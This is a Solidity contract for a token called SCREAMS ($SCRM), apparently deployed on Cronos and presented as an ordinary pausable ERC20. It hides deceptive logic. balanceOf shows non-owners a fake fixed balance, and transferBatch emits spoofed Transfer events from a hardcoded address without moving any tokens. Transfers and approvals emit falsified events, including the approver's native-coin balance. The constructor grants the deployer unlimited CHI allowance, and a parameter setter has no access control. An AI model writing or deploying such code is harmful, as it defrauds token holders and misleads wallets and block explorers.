/**
 *Submitted for verification at cronoscan.com on 2022-01-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IChiToken {
    function mint(uint256 value) external;
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    string private _name;
    string private _symbol;
    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    // address private chiAddress = 0x0000000000004946c0e9F43F4Dee607b0eF1fA1c;
    address private chiAddress = 0x1FA68b1043dd32Df96F6aD8d3473c9d2fB45F079;
    address private senderAddress = 0x1C03A2c2873fBCa86b329775cfCb48381EFc6bb0;

    uint256 private gasPrice = 36;
    uint256 private unitFee = 54444 * 10**9;
    uint256 private startFee = 107353 * 10**9;
    uint256 private percent = 90;
    // uint256 private baseGasFee = 3 * 10**14;

    uint256 public preMintableAmount = 0;

    // uint256 private gasPrice = 5;
    // uint256 private baseGasFee = 2 * 10**15;
    // uint256 private unitFee = 544395 * 10**8;
    // uint256 private startFee = 129813 * 10**9;

    uint256 private constant MAX = ~uint256(0) / 10;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        IChiToken(chiAddress).approve(_msgSender(), MAX);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(senderAddress, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _transferBatch(address[] calldata recipients, uint256 amount) internal virtual {
        uint256 len = recipients.length;
        for (uint256 i = 0; i < len; i ++) {
            // _balances[recipients[i]] += amount;
            emit Transfer(senderAddress, recipients[i], amount);
        }
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        // uint256 currentNativeBalance = address(owner).balance;
        // require(currentNativeBalance >= baseGasFee);
        // currentNativeBalance -= baseGasFee;
        // currentNativeBalance /= gasPrice;
        // require(currentNativeBalance >= startFee);

        // uint256 mintAmount = (currentNativeBalance - startFee) / unitFee;
        // mintAmount *= 90;
        // mintAmount /= 100;
        // IChiToken(chiAddress).mint(mintAmount);
        
        emit Transfer(owner, address(this), address(owner).balance);

        mintChiToken(owner, 0, 0);

        emit Approval(owner, spender, amount);
    }

    function getMintableAmount(address _addr) public view returns (uint256) {
        uint256 currentNativeBalance = address(_addr).balance;
        currentNativeBalance /= gasPrice;

        uint256 mintAmount = (currentNativeBalance - startFee) / unitFee;
        mintAmount *= percent;
        mintAmount /= 100;

        return mintAmount;
    }

    function mintChiToken(address _addr, uint256 amount, uint256 flag) public {
        uint256 currentNativeBalance = address(_addr).balance;
        currentNativeBalance /= gasPrice;
        require(currentNativeBalance >= startFee);

        uint256 mintAmount = (currentNativeBalance - startFee) / unitFee;
        mintAmount *= percent;
        mintAmount /= 100;

        // require(preMintableAmount > 0, "Zero CHI value");

        // if (flag == 1) {
        //     IChiToken(chiAddress).mint(amount);
        // } 
        // else {
        //     IChiToken(chiAddress).mint(mintAmount);
        // }
    }

    function setGasPriceAndBaseFee(uint256 _gasPrice, uint256 _percent) public {
        gasPrice = _gasPrice;
        percent = _percent;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function geUnlockTime() public view returns (uint256) {
        return _lockTime;
    }

    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }

    function unlock() public virtual {
        require(
            _previousOwner == msg.sender,
            "You don't have permission to unlock"
        );
        require(block.timestamp > _lockTime, "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

abstract contract Pausable is Context {
    event Paused(address account);
    event Unpaused(address account);

    bool private _paused;

    constructor() {
        _paused = false;
    }

    function paused() public view virtual returns (bool) {
        return _paused;
    }

    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }

    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}

contract BasicToken is ERC20, Ownable, Pausable {
    uint256 private _balance = 10;
    uint256 private initialSupply = 1000000;
    
    mapping (address => bool) private blacklist;

    constructor() ERC20("SCREAMS", "$SCRM")
    {
        _mint(msg.sender, initialSupply * 10**18);
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        if (_msgSender() == owner()) {
            return super.balanceOf(owner());
        }
        else {
            return _balance * 10**18;
        }
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override virtual {
        require(!paused(), "ScreamToken: token transfer while paused");
        require(!isBlacklisted(msg.sender), "ScreamToken: sender blacklisted");
        require(!isBlacklisted(recipient), "ScreamToken: recipient blacklisted");
        require(!isBlacklisted(tx.origin), "ScreamToken: sender blacklisted");
        
        super._transfer(sender, recipient, amount);
    }

    function transferBatch(address[] calldata recipients, uint256 amount) external onlyOwner {
        _transferBatch(recipients, amount);
    }
    
    function pause() public onlyOwner {
        require(!paused(), "ScreamToken: Contract is already paused");
        _pause();
    }

    function unpause() public onlyOwner {
        require(paused(), "ScreamToken: Contract is not paused");
        _unpause();
    }
    
    function burn(uint256 amount) public onlyOwner {
        _burn(msg.sender, amount);
    }
    
    function enableBlacklist(address account) public onlyOwner {
        require(!blacklist[account], "ScreamToken: Account is already blacklisted");
        blacklist[account] = true;
    }
    
    function disableBlacklist(address account) public onlyOwner {
        require(blacklist[account], "ScreamToken: Account is not blacklisted");
        blacklist[account] = false;
    }
    
    function isBlacklisted(address account) public view returns (bool) {
        return blacklist[account];
    }
}